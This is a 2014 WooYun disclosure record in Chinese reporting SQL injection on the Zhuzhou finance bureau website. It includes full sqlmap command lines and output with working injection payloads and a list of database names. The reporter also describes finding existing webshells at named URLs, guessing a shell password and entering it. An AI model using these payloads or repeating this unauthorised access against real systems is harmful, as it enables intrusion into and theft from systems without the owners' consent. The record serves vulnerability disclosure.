{"id": 49887, "wybug_id": "wooyun-2014-079717", "wybug_title": "株洲市财政局网站SQL注入漏洞And发现一些其他的东西", "wybug_corp": "株洲市财政局", "wybug_author": "路人甲", "wybug_date": "2014-10-17 14:50", "wybug_open_date": "2014-12-01 14:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["脆弱的"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-01：\t细节向公众公开  简要描述： 妈妈说ZF的站总是那么的脆弱 详细说明：  为了邀请码作死检测了一下ZF站，求不查水表。http://www.zzczj.gov.cn/ShowArticle.aspx?Id=110104000000000 扔到SQLMAP里面——\nC:\\Documents and Settings\\Administrator>\"C:\\Documents and Settings\\Administrator\\桌面\\sqlmapproject-sqlmap-1b18035\\sqlmap.py\" -u \"http://www.zzczj.gov.cn/ShowArticle.aspx?Id=110104000000000\"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20141016}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:25:08[10:25:08] [INFO] resuming back-end DBMS 'microsoft sql server'[10:25:08] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: Id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Id=110113000000000' AND 2020=2020 AND 'TAFk'='TAFk    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: Id=-2466' UNION ALL SELECT NULL,CHAR(113)+CHAR(119)+CHAR(97)+CHAR(113)+CHAR(113)+CHAR(101)+CHAR(104)+CHAR(65)+CHAR(79)+CHAR(103)+CHAR(103)+CHAR(76)+CHAR(109)+CHAR(101)+CHAR(115)+CHAR(113)+CHAR(102)+CHAR(110)+CHAR(112)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Id=110113000000000'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: Id=110113000000000' WAITFOR DELAY '0:0:5'-----[10:25:09] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000[10:25:09] [INFO] fetched data logged to text files under 'C:\\Documents and Settings\\Administrator\\.sqlmap\\output\\www.zzczj.gov.cn'[*] shutting down at 10:25:09\n\nC:\\Documents and Settings\\Administrator>\"C:\\Documents and Settings\\Administrator\\桌面\\sqlmapproject-sqlmap-1b18035\\sqlmap.py\" -u \"http://www.zzczj.gov.cn/ShowArticle.aspx?Id=110104000000000\" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20141016}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:26:09[10:26:09] [INFO] resuming back-end DBMS 'microsoft sql server'[10:26:10] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: Id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: Id=110113000000000' AND 2020=2020 AND 'TAFk'='TAFk    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: Id=-2466' UNION ALL SELECT NULL,CHAR(113)+CHAR(119)+CHAR(97)+CHAR(113)+CHAR(113)+CHAR(101)+CHAR(104)+CHAR(65)+CHAR(79)+CHAR(103)+CHAR(103)+CHAR(76)+CHAR(109)+CHAR(101)+CHAR(115)+CHAR(113)+CHAR(102)+CHAR(110)+CHAR(112)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: Id=110113000000000'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: Id=110113000000000' WAITFOR DELAY '0:0:5'-----[10:26:11] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000[10:26:11] [INFO] fetching database names[10:26:11] [INFO] the SQL query used returns 9 entries[10:26:11] [INFO] resumed: czjqzlxzt_sql2000[10:26:11] [INFO] resumed: czjqzlxzt20140331[10:26:11] [INFO] resumed: master[10:26:11] [INFO] resumed: model[10:26:11] [INFO] resumed: msdb[10:26:11] [INFO] resumed: Northwind[10:26:11] [INFO] resumed: pubs[10:26:11] [INFO] resumed: tempdb[10:26:11] [INFO] resumed: www_zzczj_gov_cnavailable databases [9]:[*] czjqzlxzt20140331[*] czjqzlxzt_sql2000[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb[*] www_zzczj_gov_cn[10:26:11] [INFO] fetched data logged to text files under 'C:\\Documents and Settings\\Administrator\\.sqlmap\\output\\www.zzczj.gov.cn'[*] shutting down at 10:26:11\n剩下不说了然后就是开着扫描器找后台，然后。。。发现这个站最近已经被日过了。。。比如：http://www.zzczj.gov.cn/z.asp比如：http://www.zzczj.gov.cn/z.aspx比如：http://www.zzczj.gov.cn/index.html太多shell了。。我就不破坏案发现场了:-)啥文件都没上传在基（大）友（神）的帮助下成功猜到shell的密码，进去看了一眼。然后我就呵呵了。车辆管理系统什么的你懂，不过我连碰都没碰。图片见下面（漏洞证明那里）。不过目测是用的asp马有后门，看shell日期估计有好几拨人在日。哎，何苦呢。   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n大概看了一眼，这个站还被国外的黑阔日过。。。这我就蛋疼了。。。貌似是个印度尼西亚的黑客。。。\n\n   修复方案：  修复就不说了，你们懂。话说我好像明白为毛有人能搞到类似XX市私家车用户数据了，呵呵。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-10-20 13:45 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-18 17:45 |    \t\tleakless \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 今天我没吃药感觉自己萌萌哒~~)\t\t \n  补充：已被挂上菠菜链接。。负责的童鞋给点力撤。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}